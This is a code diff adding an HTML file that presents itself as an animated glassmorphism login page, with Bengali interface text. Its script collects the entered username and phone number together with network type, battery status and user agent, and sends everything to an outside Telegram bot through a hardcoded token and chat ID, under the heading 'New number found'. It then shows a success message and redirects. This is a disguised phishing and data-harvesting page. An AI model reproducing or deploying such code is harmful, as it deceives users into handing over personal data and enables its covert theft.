@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Animated Glassmorphism Login Page</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="script.js"></script>
+</head>
+<body>
+    <style>
+        .inputBox {
+            position: relative;
+            margin-bottom: -30px; /* Input fields মধ্যে জায়গা বাড়ানো */
+        }
+
+        .inputBox input[type="submit"] {
+            margin-top: 40px; /* লগইন বাটনের উপরের জায়গা বাড়ানো */
+        }
+
+/* Disable button style */
+input[type="submit"]:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+}
+        .warning {
+            color: red;
+            display: none;
+            font-size: 14px;
+            font-family: 'Arial', sans-serif;
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            background-color: rgba(255, 0, 0, 0.1);
+            border: 1px solid red;
+            border-radius: 5px;
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); }
+            75% { transform: translateX(-10px); }
+            100% { transform: translateX(0); }
+        }
+
+        .success-message {
+            color: green;
+            display: none;
+            font-size: 14px;
+            font-family: 'Arial', sans-serif;
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            background-color: rgba(0, 255, 0, 0.1);
+            border: 1px solid green;
+            border-radius: 5px;
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+    </style>
+    <section>
+        <div class="leaves">
+            <!-- Leaves images here -->
+        </div>
+        <img src="bg.jpg" class="bg">
+        <img src="girl.png" class="girl">
+        <img src="trees.png" class="trees">
+        <div class="login">
+            <h2>Sign In</h2>
+            <div class="inputBox">
+                <input type="text" placeholder="Username" id="username">
+            </div>
+            <div class="inputBox">
+                <input type="tel" placeholder="Number" id="phoneNumber">
+                <p id="warning" class="warning">আপনার ফোন নাম্বারটি সঠিক নয়.!  ⚠️🚫</p>
+            </div>
+            <div class="inputBox">
+                <input type="submit" value="Login" id="btn">
+                <p id="success-message" class="success-message">লগিন সফল হয়েছে!</p>
+                
+            </div>
+
+            </div>
+        </div>
+    </section>
+
+    </div>
+    <script>
+        document.getElementById('btn').addEventListener('click', function(event) {
+    event.preventDefault(); // Prevent the form from submitting the default way
+
+    var username = document.getElementById('username').value; // Get the value of username
+    var phoneNumber = document.getElementById('phoneNumber').value; // Get the value of phone number
+    var warning = document.getElementById('warning');
+    var successMessage = document.getElementById('success-message');
+    var btn = document.getElementById('btn');
+
+    // Phone number validation
+    if (phoneNumber.length !== 11) {
+        warning.style.display = 'block';
+        warning.style.animation = 'shake 0.5s'; // Trigger shake animation
+        return; // Prevent further execution if phone number is invalid
+    } else {
+        warning.style.display = 'none';
+    }
+
+    // Disable the button to prevent multiple clicks
+    btn.disabled = true;
+
+    // Collecting network and battery information
+    var networkInfo = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+    if (networkInfo === 'wifi' || networkInfo === '4g') {
+        networkInfo = 'Wi-Fi'; // Override to 'Wi-Fi' if 4G is detected but Wi-Fi is being used
+    }
+
+    navigator.getBattery().then(function(battery) {
+        var batteryInfo = {
+            level: battery.level * 100,
+            charging: battery.charging ? 'Yes' : 'No'
+        };
+
+        var deviceName = navigator.userAgent; // Device name or user agent string
+
+        var message = `Nᴇᴡ ɴᴜᴍʙᴇʀ ғᴏᴜɴᴅ
+        
+┌─────────────────⭓
+├⪦ ∷ Nᴀᴍᴇ: ${username}\n├⪦ ∷ Nᴜᴍʙᴇʀ: ${phoneNumber}\n├⪦ ∷ Nᴇᴛᴡᴏʀᴋ: ${networkInfo}\n├⪦ ∷ Bᴀᴛᴛᴇʀʏ Lᴇᴠᴇʟ: ${batteryInfo.level}%\n├⪦ ∷ Cʜᴀʀɢɪɴɢ: ${batteryInfo.charging}
+└─────────────────⧕
+\n\n✦────────────────────────✦
+${deviceName}
+✦────────────────────────✦`;
+
+        // Telegram bot API URL
+        var token = '6696317970:AAH1NZPjLjwD_8Jav73izvSqtDKL9qGpMBE';
+        var chatId = '5624278091';
+        var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        var data = {
+            chat_id: chatId,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+            // Show success message and redirect after a short delay
+            successMessage.style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'nextpage.html'; // Replace with your desired page
+            }, 1000); // Redirect after 1 second
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            btn.disabled = false; // Re-enable button if there's an error
+        });
+    });
+});
+        
+        warning.style.animation = 'none'; // Reset animation
+setTimeout(function() {
+    warning.style.animation = ''; // Apply animation again
+}, 10);
+    </script>
+</body>
+</html>
